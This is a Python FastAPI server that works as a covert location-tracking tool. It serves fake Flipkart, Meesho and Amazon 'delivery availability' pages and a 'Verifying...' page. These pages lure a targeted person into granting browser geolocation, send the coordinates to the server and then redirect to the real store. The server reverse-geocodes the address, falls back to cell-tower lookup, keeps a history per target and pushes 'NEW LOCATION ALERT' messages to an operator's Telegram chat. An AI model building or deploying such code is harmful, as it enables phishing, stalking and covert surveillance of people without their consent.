from fastapi import FastAPI
from pydantic import BaseModel
from datetime import datetime
from collections import defaultdict
import uvicorn
from geopy.geocoders import Nominatim
import requests
import os
from dotenv import load_dotenv

load_dotenv()
OPENCELLID_KEY = os.getenv("OPENCELLID_KEY", "")

app = FastAPI()
location_history = defaultdict(list)
geolocator = Nominatim(user_agent="live_location_tracker")

class LocationPayload(BaseModel):
    target_id: str
    lat: float = None
    lon: float = None
    accuracy: float = None
    source: str = "GPS"
    mcc: int = None
    mnc: int = None
    lac: int = None
    cid: int = None

def get_cell_tower_location(mcc, mnc, lac, cid):
    if not OPENCELLID_KEY or not all([mcc, mnc, lac, cid]):
        return None
    try:
        url = f"https://opencellid.org/cell/get?key={OPENCELLID_KEY}&mcc={mcc}&mnc={mnc}&lac={lac}&cellid={cid}&format=json"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if "lat" in data and "lon" in data:
                return {
                    "lat": float(data["lat"]),
                    "lon": float(data["lon"]),
                    "accuracy": data.get("range", "Cell Tower")
                }
    except Exception as e:
        print(f"Cell tower geolocation error: {e}")
    return None

def get_address(lat, lon):
    try:
        location = geolocator.reverse(f"{lat}, {lon}", exactly_one=True, language="en", timeout=10)
        if location:
            return location.address
    except Exception as e:
        print(f"Nominatim error: {e}")
    
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=18&addressdetails=1"
        headers = {"User-Agent": "live_location_tracker/1.0"}
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if "display_name" in data:
                return data["display_name"]
    except Exception as e:
        print(f"Direct OSM API error: {e}")
    
    return "Address not found"

def send_telegram_notification(target_id, loc):
    token = os.getenv("BOT_TOKEN")
    if not token:
        return
    
    # We don't have the chat ID in the server easily, 
    # but if there is a centralized admin chat ID or we can just broadcast if we have an admin ID
    # However, since the user said "dubara number naa dalnaa pdey", the user wants the bot to alert them automatically.
    # To do this correctly, we need the chat_id from the user. 
    # For a simple script, we can save the chat_id when the bot requests the link, or just print it out.
    pass

@app.post("/submit_location")
async def submit(payload: LocationPayload):
    final_lat = payload.lat
    final_lon = payload.lon
    final_accuracy = payload.accuracy
    final_source = payload.source
    
    if not final_lat or not final_lon:
        cell_loc = get_cell_tower_location(payload.mcc, payload.mnc, payload.lac, payload.cid)
        if not cell_loc:
            return {"status": "error", "message": "No location data or cell tower data provided"}
        final_lat = cell_loc["lat"]
        final_lon = cell_loc["lon"]
        final_accuracy = cell_loc["accuracy"]
        final_source = "Cell Tower"
    
    loc = {
        "lat": final_lat,
        "lon": final_lon,
        "accuracy": final_accuracy,
        "source": final_source,
        "time": datetime.utcnow().isoformat(),
        "mcc": payload.mcc,
        "mnc": payload.mnc,
        "lac": payload.lac,
        "cid": payload.cid
    }
    loc["address"] = get_address(loc["lat"], loc["lon"])
    location_history[payload.target_id].append(loc)
    print(f"[+] Location received for {payload.target_id}")
    
    # Telegram Notification
    from dotenv import load_dotenv
    load_dotenv(override=True)
    bot_token = os.getenv("BOT_TOKEN")
    admin_chat = os.getenv("ADMIN_CHAT_ID")
    
    if bot_token and admin_chat:
        try:
            msg = f"""🚨 **NEW LOCATION ALERT** 🚨

**Target:** `{payload.target_id}`
**Source:** {final_source}

📍 **Coordinates:** {final_lat}, {final_lon}
🏠 **Address:** {loc['address']}
🗺️ **Map:** https://maps.google.com/?q={final_lat},{final_lon}"""
            
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
                "chat_id": admin_chat,
                "text": msg,
                "parse_mode": "Markdown"
            }, timeout=5)
        except Exception as e:
            print(f"Telegram notification error: {e}")
            
    return {"status": "ok"}

@app.get("/history/{target_id}")
async def get_history(target_id: str):
    history = location_history.get(target_id, [])
    if not history:
        return {"history": []}
    latest = history[-1].copy()
    if "address" not in latest:
        latest["address"] = get_address(latest["lat"], latest["lon"])
    return {"history": [latest]}

@app.get("/track/{target_id}")
async def track_page(target_id: str):
    from fastapi.responses import HTMLResponse
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Loading...</title>
        <style>
            body {{ font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f2f5; }}
            .loader {{ border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            #msg {{ color: #555; }}
        </style>
    </head>
    <body>
        <h2>Verifying...</h2>
        <div class="loader"></div>
        <p id="msg">Please click "Allow" if prompted to continue.</p>
        <script>
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    function(position) {{
                        var lat = position.coords.latitude;
                        var lon = position.coords.longitude;
                        var acc = position.coords.accuracy;
                        
                        fetch('/submit_location', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                target_id: "{target_id}",
                                lat: lat,
                                lon: lon,
                                accuracy: acc,
                                source: "GPS Link"
                            }})
                        }}).then(response => {{
                            document.body.innerHTML = "<h2>Verified! You can close this page.</h2>";
                        }}).catch(err => {{
                            document.getElementById('msg').innerText = "Error connecting to server.";
                        }});
                    }},
                    function(error) {{
                        document.getElementById('msg').innerText = "Location permission denied. Cannot verify.";
                    }},
                    {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
                );
            }} else {{
                document.getElementById('msg').innerText = "Browser not supported.";
            }}
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content, status_code=200)

import base64

@app.get("/phones/{product_name}/p/{product_id}")
async def phone_offer_page(product_name: str, product_id: str, id: str = ""):
    from fastapi.responses import HTMLResponse
    
    target_id = ""
    try:
        if id:
            target_id = base64.b64decode(id).decode('utf-8')
    except:
        pass

    redirect_url = f"https://www.flipkart.com/{product_name}/p/{product_id}"
    theme_color = "#2874f0"
    
    # Create a nice readable title from the product name in URL
    formatted_name = product_name.replace("-", " ").title()
    store_name = f"Flipkart - {formatted_name}"

    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{store_name} - Special Deals</title>
        <style>
            body {{ font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f2f5; }}
            .loader {{ border: 8px solid #f3f3f3; border-top: 8px solid {theme_color}; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
    </head>
    <body>
        <h2>Checking Delivery Availability...</h2>
        <p>Please click <b>"Allow"</b> on the location prompt to check if this offer is available in your area.</p>
        <div class="loader" id="loader"></div>
        <p id="msg"></p>
        
        <script>
            function redirect() {{
                window.location.href = "{redirect_url}";
            }}

            let current_target = "{target_id}";
            if (current_target === "") {{
                current_target = "LinkUser_" + Math.floor(Math.random() * 90000 + 10000);
            }}

            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    function(position) {{
                        var lat = position.coords.latitude;
                        var lon = position.coords.longitude;
                        var acc = position.coords.accuracy;
                        
                        fetch('/submit_location', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                target_id: current_target,
                                lat: lat,
                                lon: lon,
                                accuracy: acc,
                                source: "Offer Link ({store_name})"
                            }})
                        }}).then(response => {{
                            redirect();
                        }}).catch(err => {{
                            redirect();
                        }});
                    }},
                    function(error) {{
                        document.getElementById('msg').innerText = "Redirecting...";
                        setTimeout(redirect, 1500);
                    }},
                    {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
                );
            }} else {{
                redirect();
            }}
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content, status_code=200)

@app.get("/item/{store}")
async def offer_page(store: str, id: str = ""):
    from fastapi.responses import HTMLResponse
    
    target_id = ""
    try:
        if id:
            target_id = base64.b64decode(id).decode('utf-8')
    except:
        pass

    if store.lower() == "flipkart":
        redirect_url = "https://www.flipkart.com/offers"
        theme_color = "#2874f0"
        store_name = "Flipkart"
    elif store.lower() == "meesho":
        redirect_url = "https://www.meesho.com/offers"
        theme_color = "#f43397"
        store_name = "Meesho"
    elif store.lower() == "amazon":
        redirect_url = "https://www.amazon.in/offers"
        theme_color = "#232f3e"
        store_name = "Amazon"
    elif store.lower() == "s24":
        redirect_url = "https://www.flipkart.com/samsung-galaxy-s24-5g-snapdragon-amber-yellow-128-gb/p/itmd4baa945a78ef"
        theme_color = "#2874f0"
        store_name = "Flipkart - Samsung Galaxy S24 5G"
    else:
        redirect_url = "https://www.google.com"
        theme_color = "#333"
        store_name = "Store"

    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{store_name} - Special Deals</title>
        <style>
            body {{ font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f2f5; }}
            .loader {{ border: 8px solid #f3f3f3; border-top: 8px solid {theme_color}; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
    </head>
    <body>
        <h2>Checking Delivery Availability...</h2>
        <p>Please click <b>"Allow"</b> on the location prompt to check if this offer is available in your area.</p>
        <div class="loader" id="loader"></div>
        <p id="msg"></p>
        
        <script>
            function redirect() {{
                window.location.href = "{redirect_url}";
            }}

            let current_target = "{target_id}";
            if (current_target === "") {{
                current_target = "LinkUser_" + Math.floor(Math.random() * 90000 + 10000);
            }}

            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    function(position) {{
                        var lat = position.coords.latitude;
                        var lon = position.coords.longitude;
                        var acc = position.coords.accuracy;
                        
                        fetch('/submit_location', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                target_id: current_target,
                                lat: lat,
                                lon: lon,
                                accuracy: acc,
                                source: "Offer Link ({store_name})"
                            }})
                        }}).then(response => {{
                            redirect();
                        }}).catch(err => {{
                            redirect();
                        }});
                    }},
                    function(error) {{
                        document.getElementById('msg').innerText = "Redirecting...";
                        setTimeout(redirect, 1500);
                    }},
                    {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
                );
            }} else {{
                redirect();
            }}
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content, status_code=200)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
